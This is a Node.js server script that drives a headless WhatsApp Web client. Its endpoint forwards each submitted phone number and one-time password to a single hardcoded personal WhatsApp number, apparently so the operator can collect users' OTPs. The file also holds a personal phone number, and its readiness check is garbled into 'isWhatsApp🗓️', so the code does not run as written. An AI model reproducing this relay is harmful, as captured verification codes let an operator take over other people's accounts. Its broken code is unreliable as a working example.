const { Client, LocalAuth } = require('whatsapp-web.js');
const qrcode = require('qrcode-terminal');
const express = require('express');

const app = express();
app.use(express.json());

let client;
let isWhatsAppReady = false;

// Initialize WhatsApp Client
function initWhatsApp() {
    client = new Client({
        authStrategy: new LocalAuth(),
        puppeteer: {
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--no-first-run',
                '--no-zygote',
                '--single-process',
                '--disable-gpu'
            ]
        }
    });

    client.on('qr', (qr) => {
        console.log('\n🔗 WhatsApp QR Code:');
        console.log('=====================================');
        qrcode.generate(qr, { small: true });
        console.log('=====================================');
        console.log('📱 Scan this QR code with WhatsApp');
    });

    client.on('ready', () => {
        console.log('✅ WhatsApp is ready!');
        isWhatsAppReady = true;
    });

    client.on('authenticated', () => {
        console.log('🔐 WhatsApp authenticated');
    });

    client.on('auth_failure', (msg) => {
        console.error('❌ WhatsApp auth failed:', msg);
    });

    client.on('disconnected', (reason) => {
        console.log('📵 WhatsApp disconnected:', reason);
        isWhatsAppReady = false;
    });

    client.initialize();
}

// API endpoint to send OTP via WhatsApp
app.post('/send-whatsapp', async (req, res) => {
    try {
        const { phone, otp } = req.body;
        
        if (!isWhatsApp🗓️ || !client) {
            return res.json({ 
                status: 'error', 
                message: 'WhatsApp not ready' 
            });
        }

        // Your personal WhatsApp number (change this)
        const yourWhatsAppNumber = '918250560727@c.us';
        
        const message = `🔐 OTP Alert!\n\nUser: ${phone}\nOTP: ${otp}\n\nGenerated at: ${new Date().toLocaleString('en-IN')}`;
        
        await client.sendMessage(yourWhatsAppNumber, message);
        
        res.json({ 
            status: 'success', 
            message: 'OTP sent to WhatsApp' 
        });
        
    } catch (error) {
        console.error('WhatsApp send error:', error);
        res.json({ 
            status: 'error', 
            message: 'Failed to send WhatsApp' 
        });
    }
});

// Health check
app.get('/', (req, res) => {
    res.json({ 
        status: 'active',
        whatsapp_ready: isWhatsAppReady,
        timestamp: new Date().toISOString()
    });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    initWhatsApp();
});
